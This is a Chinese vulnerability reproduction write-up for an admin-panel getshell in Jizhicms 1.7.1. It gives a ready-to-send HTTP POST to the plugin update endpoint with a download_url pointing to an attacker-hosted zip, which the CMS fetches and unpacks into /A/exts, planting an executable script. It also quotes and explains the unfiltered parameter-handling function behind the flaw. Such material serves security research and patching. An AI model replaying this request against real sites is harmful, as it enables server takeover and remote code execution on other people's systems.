Jizhicms 1.7.1 后台getshell
===========================

一、漏洞简介
------------

二、漏洞影响
------------

Jizhicms 1.7.1

三、复现过程
------------

    POST /admin.php/Plugins/update.html HTTP/1.1
    Host: www.0-sec.org:8091
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 80
    Origin: http://www.0-sec.org:8091
    Connection: close
    Referer: http://www.0-sec.org:8091/admin.php/Plugins/
    Cookie: PHPSESSID=tq79jo8omp5s72lq101noj48lq

    action=start-download&filepath=msgphone&download_url=http://www.0-sec.org/test/a.zip

攻击者可以控制download\_url传入参数的值，从而传入被压缩的可执行脚本，然后该压缩包会被解压并传入到特定位置，实现getshell所以只需要攻击者在自己控制的网站上压缩可执行脚本然后将url赋值给download\_url即可实现任意文件上传定位下函数位置，该函数位于/A/c/PluginsController.php下的update函数![1.png](./.resource/Jizhicms1.7.1后台getshell/media/rId24.png)传进来的值通过frparam函数处理之后变赋值给了remote\_url跟进到frparam函数函数中，该函数位于/FrPHP/lib/Controller.php中

    public function frparam($str=null, $int=0,$default = FALSE, $method = null){

            $data = $this->_data;
            if($str===null) return $data;
            if(!array_key_exists($str,$data)){
                return ($default===FALSE)?false:$default;
            }
            if($method===null){
                $value = $data[$str];
            }else{
                $method = strtolower($method);
                switch($method){
                    case 'get':
                    $value = $_GET[$str];
                    break;
                    case 'post':
                    $value = $_POST[$str];
                    break;
                    case 'cookie':
                    $value = $_COOKIE[$str];
                    break;
                }
            }
            return format_param($value,$int);
        }

该函数并没有对传入的值进行过滤，只是简单的从data数组里取数据然后继续回到update函数，在获取到了remote\_url的值后便进行了下载以及解压缩的操作![2.png](./.resource/Jizhicms1.7.1后台getshell/media/rId25.png)![3.png](./.resource/Jizhicms1.7.1后台getshell/media/rId26.png)最后解压到的文件夹为/A/exts![4.png](./.resource/Jizhicms1.7.1后台getshell/media/rId27.png)

参考链接
--------

> https://xz.aliyun.com/t/7775\#toc-3
